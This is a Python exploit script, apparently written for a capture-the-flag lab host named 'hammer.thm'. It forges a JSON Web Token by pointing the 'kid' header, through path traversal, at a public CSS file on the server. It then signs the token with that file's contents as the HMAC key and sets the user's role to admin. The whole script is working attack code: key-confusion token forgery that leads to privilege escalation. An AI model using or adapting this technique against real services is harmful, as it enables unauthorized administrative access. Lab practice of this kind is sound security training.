import hmac
import hashlib
import base64
import json
import time
import os

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    encoded = base64.urlsafe_b64encode(data).decode('utf-8')
    return encoded.replace('=', '')

# Load the local copy of the CSS file to use as the signing key
# Requirement: Download the file via 'wget' before running this script
try:
    with open("my_secret_key.css", "rb") as f:
        secret = f.read()
    print(f"[*] CSS loaded as key. Size: {len(secret)} bytes")
except FileNotFoundError:
    print("[!] Error: 'my_secret_key.css' not found. Please download it from the target first!")
    exit()

# 1. MODIFIED HEADER
# Exploiting Path Traversal in 'kid' to point to a known static file on the server
header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/hmr_css/bootstrap.min.css" 
}

# 2. MODIFIED PAYLOAD
# Escalating privileges to 'admin'
current_time = int(time.time())
payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": current_time,
    "exp": current_time + 3600,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"  # <--- Privilege Escalation
    }
}

# 3. TOKEN CONSTRUCTION
encoded_header = base64url_encode(json.dumps(header, separators=(',', ':')))
encoded_payload = base64url_encode(json.dumps(payload, separators=(',', ':')))
token_data = f"{encoded_header}.{encoded_payload}"

# 4. SIGNING THE TOKEN
# Using the CSS file content as the secret key
signature = hmac.new(secret, token_data.encode('utf-8'), hashlib.sha256).digest()
encoded_signature = base64url_encode(signature)

jwt_forged = f"{token_data}.{encoded_signature}"

print("-" * 50)
print("NEW TOKEN (Role: admin | Key: bootstrap.min.css):")
print("-" * 50)
print(jwt_forged)
print("-" * 50)
